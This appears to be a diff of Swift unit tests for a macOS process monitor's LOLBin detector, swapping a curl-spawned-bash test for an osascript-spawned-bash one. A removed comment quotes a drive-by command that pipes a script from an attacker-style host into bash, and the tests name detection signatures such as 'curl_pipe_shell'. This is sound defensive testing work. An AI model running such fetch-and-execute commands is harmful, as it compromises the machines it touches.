@@ -71,27 +71,25 @@ final class ProcessMonitorTests: XCTestCase {
 
     // MARK: - Signal: LOLBin
 
-    func test_signals_bashSpawnedByCurl_returnsCriticalSignal() {
-        // Classic drive-by: `curl https://evil.com/payload.sh | bash`
-        // The LOLBinDetector builds its search string as
-        //   proc.path + " " + proc.name + " " + parentName
-        // so bash whose parent is named "curl" → search string contains "curl"
-        // → matches the `curl_pipe_shell` signature (severity .critical).
+    func test_signals_bashSpawnedByOsascript_returnsMediumLolbinSignal() {
+        // osascript spawning bash is a recognised LOLBin pattern (not a legitimate
+        // terminal parent).  ProcessScanner.signals() emits reason "lolbin" with
+        // severity .medium for shells whose parent is neither a terminal emulator
+        // nor in the trusted-process allowlist.
         //
-        // Note: launchd is in the trusted-parent list, so bash-from-launchd is
-        // intentionally suppressed (legitimate LaunchAgents use bash).  curl is
-        // NOT trusted, so the parent check does not suppress this signal.
-        let curlProc = makeProcess(pid: 299, name: "curl",
-                                   path: "/usr/bin/curl",
-                                   signing: .signed(teamID: "APPLE"))
+        // Note: launchd IS in the trusted list, so bash-from-launchd is intentionally
+        // suppressed.  osascript is NOT trusted, so the signal is emitted.
+        let osascriptProc = makeProcess(pid: 499, name: "osascript",
+                                        path: "/usr/bin/osascript",
+                                        signing: .signed(teamID: "APPLE"))
         let bashProc = makeProcess(pid: 300, name: "bash",
                                    path: "/bin/bash",
                                    signing: .signed(teamID: "APPLE"),
-                                   parentPID: 299)
-        let signals = scanner.signals(from: [curlProc, bashProc])
-        let lolbinSignals = signals.filter { $0.metadata["reason"] == "curl_pipe_shell" }
+                                   parentPID: 499)
+        let signals = scanner.signals(from: [osascriptProc, bashProc])
+        let lolbinSignals = signals.filter { $0.metadata["reason"] == "lolbin" }
         XCTAssertEqual(lolbinSignals.count, 1)
-        XCTAssertEqual(lolbinSignals[0].severity, .critical)
+        XCTAssertEqual(lolbinSignals[0].severity, .medium)
     }
 
     func test_signals_zshSpawnedByTerminal_returnsNoLolbinSignal() {
